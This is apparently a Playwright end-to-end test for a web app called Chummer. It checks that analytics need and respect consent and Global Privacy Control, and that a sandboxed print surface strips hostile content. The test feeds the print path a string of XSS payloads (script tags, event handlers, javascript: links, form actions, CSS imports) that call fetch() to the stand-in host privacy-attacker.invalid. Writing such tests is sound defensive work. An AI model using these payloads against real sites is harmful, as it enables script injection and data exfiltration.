#!/usr/bin/env node
'use strict';

const { chromium } = require('playwright');

const baseUrl = (process.env.CHUMMER_BLAZOR_BASE_URL || 'http://127.0.0.1:8089').replace(/\/$/, '');
const appUrl = process.env.CHUMMER_BUILD_PRIVACY_URL
  || `${baseUrl}/app?fixture=blue&workspace=private-workspace&runner=private-runner&note=private-free-text`;

function assert(condition, message) {
  if (!condition) {
    throw new Error(message);
  }
}

async function assertPrivateAnalyticsEndpoint(page) {
  const config = await page.locator('meta[name="chummer-analytics-config"]').evaluate((element) => ({
    endpointUrl: element.dataset.endpointUrl,
    siteId: element.dataset.siteId,
    consentDefault: element.dataset.consentDefault,
    automaticPageviews: element.dataset.automaticPageviews
  }));
  assert(config.endpointUrl === `${baseUrl}/api/track`,
    `Server rendered the wrong analytics endpoint: ${config.endpointUrl}`);
  assert(config.siteId === 'privacy-e2e', 'Server rendered the wrong analytics site ID.');
  assert(config.consentDefault === 'denied', 'Server did not render denied-by-default analytics.');
  assert(config.automaticPageviews === 'disabled', 'Server did not disable automatic pageviews.');
}

async function installPrivacyDefaults(context, globalPrivacyControl = false) {
  await context.addInitScript(({ gpc }) => {
    try {
      localStorage.removeItem('chummer.analytics.consent.v1');
      localStorage.removeItem('disable-rybbit');
    } catch (_error) {
    }
    try {
      Object.defineProperty(navigator, 'globalPrivacyControl', { configurable: true, get: () => gpc });
      Object.defineProperty(navigator, 'doNotTrack', { configurable: true, get: () => '0' });
    } catch (_error) {
    }
  }, { gpc: globalPrivacyControl });
}

async function runConsentAndPrintBoundary(browser) {
  const context = await browser.newContext({ viewport: { width: 1280, height: 900 } });
  await installPrivacyDefaults(context);
  const page = await context.newPage();
  const trackPayloads = [];
  const attackerRequests = [];
  page.on('request', (request) => {
    if (request.url().includes('privacy-attacker.invalid')) {
      attackerRequests.push(request.url());
    }
  });
  await page.route('**/api/track', async (route) => {
    trackPayloads.push(JSON.parse(route.request().postData() || '{}'));
    await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' });
  });
  await page.route('**://privacy-attacker.invalid/**', (route) => route.abort());

  try {
    await page.goto(appUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
    await page.waitForFunction(() => Boolean(window.chummerAnalytics && window.chummerPrints), null, { timeout: 30000 });
    await page.locator('.build-pwa-workspace').waitFor({ state: 'visible', timeout: 30000 });
    await assertPrivateAnalyticsEndpoint(page);
    await page.waitForTimeout(250);
    assert(trackPayloads.length === 0, 'Analytics made a request during page load before consent.');

    const preConsentResult = await page.evaluate(() => window.chummerAnalytics.event(
      'editor_action',
      { action_category: 'save', workspace_id: 'must-not-leak', free_text: 'must-not-leak' }));
    assert(preConsentResult === false, 'Analytics accepted an event before explicit consent.');
    assert(trackPayloads.length === 0, 'Analytics queued or sent a pre-consent event.');

    const preferences = page.locator('[data-chummer-analytics-preferences]');
    await preferences.waitFor({ state: 'attached', timeout: 15000 });
    assert((await preferences.textContent()).includes('automatic pageviews are never sent'),
      'Consent UI does not explain the automatic-pageview boundary.');
    await preferences.locator('summary').click();
    await page.locator('[data-chummer-analytics-consent-grant]').click();
    assert((await page.locator('[data-chummer-analytics-consent-status]').textContent()).includes('are on'),
      'Consent status did not announce opt-in.');

    const consentedResult = await page.evaluate(() => window.chummerAnalytics.event(
      'editor_action',
      {
        action_category: 'save',
        workspace_id: 'private-workspace',
        runner_name: 'private-runner',
        free_text: 'private-free-text'
      }));
    const consentedDiagnostics = await page.evaluate(() => ({
      status: window.chummerAnalytics.status(),
      config: document.querySelector('meta[name="chummer-analytics-config"]')?.outerHTML || ''
    }));
    assert(consentedResult === true,
      `Allowlisted analytics event was not delivered after consent: ${JSON.stringify(consentedDiagnostics)}, requests=${trackPayloads.length}.`);
    assert(trackPayloads.length === 1, `Expected one consented analytics request, received ${trackPayloads.length}.`);

    const payload = trackPayloads[0];
    assert(JSON.stringify(Object.keys(payload).sort())
      === JSON.stringify(['event_name', 'pathname', 'properties', 'site_id', 'type']),
    `Analytics payload keys escaped the fixed contract: ${JSON.stringify(Object.keys(payload))}`);
    assert(payload.site_id === 'privacy-e2e', 'Analytics payload used the wrong fixed site ID.');
    assert(payload.type === 'custom_event', 'Analytics payload type was not custom_event.');
    assert(payload.pathname === '/editor', 'Analytics payload leaked the browser pathname or query.');
    assert(payload.event_name === 'chummer_editor_action', 'Analytics payload used an unexpected event name.');
    assert(JSON.stringify(JSON.parse(payload.properties)) === JSON.stringify({ action_category: 'save' }),
      `Analytics properties escaped the categorical allowlist: ${payload.properties}`);
    const serializedPayload = JSON.stringify(payload);
    for (const secret of ['private-workspace', 'private-runner', 'private-free-text', 'fixture=blue']) {
      assert(!serializedPayload.includes(secret), `Analytics leaked private value: ${secret}`);
    }

    const invalidResult = await page.evaluate(() => window.chummerAnalytics.event(
      'free_form_event',
      { value: 'private-free-text' }));
    assert(invalidResult === false, 'Analytics accepted a free-form event name.');
    assert(trackPayloads.length === 1, 'Invalid analytics event caused a request.');

    if (!await preferences.evaluate((element) => element.open)) {
      await preferences.locator('summary').click();
    }
    await page.locator('[data-chummer-analytics-consent-revoke]').click();
    const revokedResult = await page.evaluate(() => window.chummerAnalytics.event(
      'editor_action',
      { action_category: 'print' }));
    assert(revokedResult === false, 'Analytics accepted an event after immediate revocation.');
    await page.waitForTimeout(100);
    assert(trackPayloads.length === 1, 'Analytics sent a request after consent revocation.');
    assert((await page.locator('[data-chummer-analytics-consent-status]').textContent()).includes('are off'),
      'Consent status did not announce revocation.');

    await page.evaluate(() => {
      window.__chummerPopupCount = 0;
      window.__chummerPrintCount = 0;
      window.open = () => {
        window.__chummerPopupCount += 1;
        return null;
      };
      window.print = () => {
        window.__chummerPrintCount += 1;
      };
    });

    const maliciousHtml = [
      '<main><h1 onclick="fetch(\'https://privacy-attacker.invalid/click\')">Safe runner sheet</h1>',
      '<p>Benign printable text</p>',
      '<script>fetch("https://privacy-attacker.invalid/script")</script>',
      '<img src="https://privacy-attacker.invalid/image" onerror="fetch(\'https://privacy-attacker.invalid/error\')">',
      '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
      '<svg><script>fetch("https://privacy-attacker.invalid/svg")</script></svg>',
      '<form action="https://privacy-attacker.invalid/form"><input name="runner"></form>',
      '<a href="javascript:alert(1)">Printable link label</a>',
      '<style>@import "https://privacy-attacker.invalid/style"</style></main>'
    ].join('');
    await page.evaluate((encoded) => window.chummerPrints.openBase64(
      'runner.html', encoded, 'text/html', '<private title>'),
    Buffer.from(maliciousHtml, 'utf8').toString('base64'));
    await page.waitForFunction(() => window.__chummerPrintCount === 1, null, { timeout: 15000 });

    const printSurface = await page.evaluate(() => {
      const frame = document.querySelector('[data-chummer-print-surface]');
      return frame ? {
        sandbox: frame.getAttribute('sandbox'),
        referrerPolicy: frame.getAttribute('referrerpolicy'),
        srcdoc: frame.getAttribute('srcdoc') || '',
        popupCount: window.__chummerPopupCount,
        printCount: window.__chummerPrintCount
      } : null;
    });
    assert(printSurface, 'Sandboxed print surface was not created.');
    assert(printSurface.sandbox === '', 'Print surface sandbox gained capabilities.');
    assert(printSurface.referrerPolicy === 'no-referrer', 'Print surface did not suppress referrers.');
    assert(printSurface.popupCount === 0, 'Print path attempted to open a popup.');
    assert(printSurface.printCount === 1, 'Trusted parent did not invoke Chromium print exactly once.');
    assert(printSurface.srcdoc.includes("default-src 'none'"), 'Print srcdoc omitted its deny-by-default CSP.');
    assert(printSurface.srcdoc.includes("script-src 'none'"), 'Print srcdoc omitted script blocking.');
    assert(printSurface.srcdoc.includes("connect-src 'none'"), 'Print srcdoc omitted network blocking.');
    assert(printSurface.srcdoc.includes('Safe runner sheet'), 'Print sanitization removed benign content.');
    assert(printSurface.srcdoc.includes('Printable link label'), 'Print sanitization removed benign link text.');
    for (const forbidden of [
      '<script', '<form', '<input', '<svg', 'onclick=', 'onerror=', 'javascript:',
      'privacy-attacker.invalid', 'data:image/svg+xml', 'allow-same-origin'
    ]) {
      assert(!printSurface.srcdoc.toLowerCase().includes(forbidden),
        `Print srcdoc retained forbidden content: ${forbidden}`);
    }
    assert(attackerRequests.length === 0,
      `Hostile printable content caused network requests: ${attackerRequests.join(', ')}`);

    await page.evaluate(() => window.dispatchEvent(new Event('afterprint')));
    await page.waitForFunction(() => !document.querySelector('[data-chummer-print-surface]'));
    const plainText = '<script>fetch("https://privacy-attacker.invalid/plain")</script> Plain text';
    await page.evaluate((encoded) => window.chummerPrints.openBase64(
      'runner.txt', encoded, 'text/plain', 'Plain text'),
    Buffer.from(plainText, 'utf8').toString('base64'));
    await page.waitForFunction(() => window.__chummerPrintCount === 2, null, { timeout: 15000 });
    const plainSrcdoc = await page.locator('[data-chummer-print-surface]').getAttribute('srcdoc');
    assert(plainSrcdoc.includes('&lt;script&gt;'), 'Plain-text print content was interpreted as HTML.');
    assert(attackerRequests.length === 0, 'Plain-text print content caused a network request.');

    const unsupportedMimeRejected = await page.evaluate((encoded) => {
      try {
        window.chummerPrints.openBase64('runner.svg', encoded, 'image/svg+xml', 'SVG');
        return false;
      } catch (error) {
        return error instanceof TypeError;
      }
    }, Buffer.from('<svg/>', 'utf8').toString('base64'));
    assert(unsupportedMimeRejected, 'Print boundary accepted an unsupported active-content MIME type.');
  } finally {
    await context.close();
  }
}

async function runGlobalPrivacyControlBoundary(browser) {
  const context = await browser.newContext({ viewport: { width: 900, height: 700 } });
  await installPrivacyDefaults(context, true);
  const page = await context.newPage();
  let trackRequestCount = 0;
  await page.route('**/api/track', async (route) => {
    trackRequestCount += 1;
    await route.fulfill({ status: 200, contentType: 'application/json', body: '{}' });
  });
  try {
    await page.goto(appUrl, { waitUntil: 'domcontentloaded', timeout: 60000 });
    await page.waitForFunction(() => Boolean(window.chummerAnalytics), null, { timeout: 30000 });
    await assertPrivateAnalyticsEndpoint(page);
    const status = await page.evaluate(async () => {
      const consentResult = window.chummerAnalytics.setConsent(true);
      const eventResult = await window.chummerAnalytics.event(
        'editor_action',
        { action_category: 'save' });
      return { consentResult, eventResult, analyticsStatus: window.chummerAnalytics.status() };
    });
    assert(status.consentResult === false, 'GPC did not override an opt-in request.');
    assert(status.eventResult === false, 'GPC allowed an analytics event.');
    assert(status.analyticsStatus.privacySignalEnabled === true, 'GPC was not exposed in analytics status.');
    assert(status.analyticsStatus.consentGranted === false, 'GPC left analytics consent effective.');
    assert(trackRequestCount === 0, 'GPC boundary allowed an analytics request.');
    assert(await page.locator('[data-chummer-analytics-consent-grant]').isDisabled(),
      'GPC did not disable the analytics opt-in control.');
    assert((await page.locator('[data-chummer-analytics-consent-status]').textContent()).includes('privacy signal'),
      'Consent UI did not explain the browser privacy signal.');
  } finally {
    await context.close();
  }
}

async function run() {
  const browser = await chromium.launch({ headless: true });
  try {
    await runConsentAndPrintBoundary(browser);
    await runGlobalPrivacyControlBoundary(browser);
  } finally {
    await browser.close();
  }
}

run()
  .then(() => console.log('Build analytics consent and sandboxed print privacy checks passed.'))
  .catch((error) => {
    console.error(error && error.stack ? error.stack : error);
    process.exitCode = 1;
  });
